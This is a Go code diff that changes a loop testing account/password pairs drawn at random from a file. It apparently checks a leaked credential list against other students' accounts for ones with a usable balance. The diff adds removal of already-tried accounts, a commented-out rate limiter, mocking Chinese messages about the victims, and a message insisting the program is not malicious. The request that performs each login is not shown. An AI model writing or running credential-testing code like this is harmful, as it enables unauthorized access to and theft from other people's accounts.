@@ -54,9 +54,27 @@ func main() {
     userList := fileTolines(FILE)
     rand.Seed(time.Now().Unix())
     //fmt.Println(userList)
+    count := 1
 
     for {
-        line := userList[rand.Intn(len(userList))]
+
+        if count == 1 && len(userList) == 0 {
+            fmt.Println("瞎啊，密码库是空的！")
+            return
+        } else if len(userList) == 0 {
+            fmt.Println("你的学弟学妹们都太抠了，连费都舍不得充！")
+            return
+        }
+
+        // 速率限制
+        // if count%1000 == 0 {
+        //     fmt.Printf("processed at least %d iterms\n", count)
+        //     <- time.After(5 * time.Second)
+        //     fmt.Println("go on....")
+        // }
+
+        n := rand.Intn(len(userList))
+        line := userList[n]
         userInfo := strings.Split(line, "\t")
         account := userInfo[0]
         password := userInfo[3]
@@ -76,6 +94,9 @@ func main() {
                 break
             }
         }
+        // 将测试过的用户移除出当前密码库
+        userList = append(userList[:n], userList[n+1:]...)
+        count++
     }
 
     fmt.Println("看到这个，就是想证明下我不是个恶意程序，5s 之后就看不到我啦 :-)")
